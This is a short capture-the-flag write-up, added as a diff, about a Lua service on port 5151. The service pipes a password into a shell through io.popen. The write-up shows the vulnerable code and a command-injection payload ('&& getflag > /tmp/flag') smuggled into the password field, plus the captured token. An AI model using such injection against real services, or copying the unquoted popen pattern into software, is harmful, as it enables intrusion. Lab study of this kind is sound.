@@ -1,0 +1,46 @@
+# We can found in the home repository a lua script that listen to connections on 127.0.0.1:5151
+# When we try to start the script, this one tel us that the address is already used,
+# once we know that we can supposed that the script is already executed in background
+# Thanks to netstat -tunlp we can watch the port 5151 which is listening
+# Let's try to connect with netcat
+
+nc 127.0.0.1 5151
+Password:
+
+# Asking for a password like the given lua script
+# Let's take a look about the operations of the script
+# At line 20 we see that the program is waiting for the client input
+# and at line 23, the client input is sent in hash function
+
+  5 function hash(pass)
+  6   prog = io.popen("echo "..pass.." | sha1sum", "r")
+  7   data = prog:read("*all")
+  8   prog:close()
+  9
+ 10   data = string.sub(data, 1, 40)
+ 11
+ 12   return data
+ 13 end
+
+# We can see that the function use io.popen, this function will execute commands in bash as we see
+# "echo "..pass.." | sha1sum"
+# In the main while we can watch the condition that wait the result f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
+
+ 25       if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+
+# After few research, the given string refers to the string "NotSoEasy" without \n
+# When we give "-n NotSoEasy" in password, we get in the else condition
+ 
+ 27       else
+ 28           client:send("Gz you dumb*\n")
+ 29       end
+
+# Quotes in popen aren't included, let's exploit that
+# The script is launched as flag11
+
+nc 127.0.0.1 5151
+Password: && getflag > /tmp/flag
+Erf nope..
+
+cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
